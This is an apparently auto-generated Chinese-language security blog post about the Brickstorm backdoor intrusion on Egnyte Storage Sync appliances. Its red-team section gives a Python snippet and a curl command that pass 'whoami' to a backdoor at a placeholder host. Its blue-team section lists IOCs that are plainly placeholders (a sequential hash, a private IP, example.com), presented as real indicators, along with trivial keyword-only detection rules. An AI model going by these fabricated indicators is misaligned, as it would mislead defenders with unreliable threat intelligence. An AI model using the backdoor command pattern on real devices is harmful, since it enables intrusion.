---
layout: post
title:  "中國駭客瞄準缺乏EDR防護的邊界設備，藉Brickstorm後門潛伏18個月"
date:   2026-06-13 02:45:19 +0000
categories: [security]
severity: critical
---

# 🚨 解析 VerdantBamboo 入侵事件：利用 Brickstorm 後門和遭竊憑證進行長期入侵

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `後門技術`, `憑證竊取`, `網路隱蔽`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: VerdantBamboo 入侵事件的根源在於 Egnyte Storage Sync 的本地權限提升問題，攻擊者可以利用這個漏洞在 Storage Sync 設備上執行任意命令。
* **攻擊流程圖解**:
  1. 攻擊者首先利用服務帳號登入 Storage Sync 設備。
  2. 攻擊者利用帳號權限設定上的缺陷，取得可寫入系統目錄的能力。
  3. 攻擊者將 Brickstorm 後門放進需要高權限才能操作的位置，並在需要時手動啟動後門。
* **受影響元件**: Egnyte Storage Sync v13.12 及之前版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要獲得 Storage Sync 設備的服務帳號和密碼。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 定義 Brickstorm 後門的 URL 和參數
    url = "https://example.com/brickstorm"
    params = {"cmd": "exec", "arg": "whoami"}
    
    # 發送請求到 Brickstorm 後門
    response = requests.get(url, params=params)
    
    # 輸出執行結果
    print(response.text)
    
    ```
  *範例指令*: `curl -X GET "https://example.com/brickstorm?cmd=exec&arg=whoami"`
* **繞過技術**: 攻擊者可以利用遭竊憑證和 Brickstorm 後門的代理連線能力，繞過受害組織的條件式存取政策。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /usr/local/brickstorm |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Brickstorm_Detection {
      meta:
        description = "Detects Brickstorm malware"
      strings:
        $a = "brickstorm" ascii
      condition:
        $a at 0
    }
    
    ```
  或者是具體的 **SIEM 查詢語法** (Splunk/Elastic):

    ```
    
    sql
    index=security sourcetype=linux_secure | search "brickstorm"
    
    ```
* **緩解措施**: 更新 Egnyte Storage Sync 至 v13.13 或以上版本，並設定強密碼和多因素驗證。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **後門技術 (Backdoor)**: 想像一個秘密的門，可以讓攻擊者在任何時候進入系統。技術上是指一種允許攻擊者遠程存取和控制系統的技術。
* **憑證竊取 (Credential Theft)**: 想像有人偷走了你的身份證。技術上是指攻擊者竊取了系統的憑證，例如密碼或私鑰。
* **網路隱蔽 (Network Evasion)**: 想像攻擊者可以隱藏在網路中，避免被發現。技術上是指攻擊者利用各種技術，例如代理連線和加密，來隱藏自己的網路活動。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.ithome.com.tw/news/176583)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


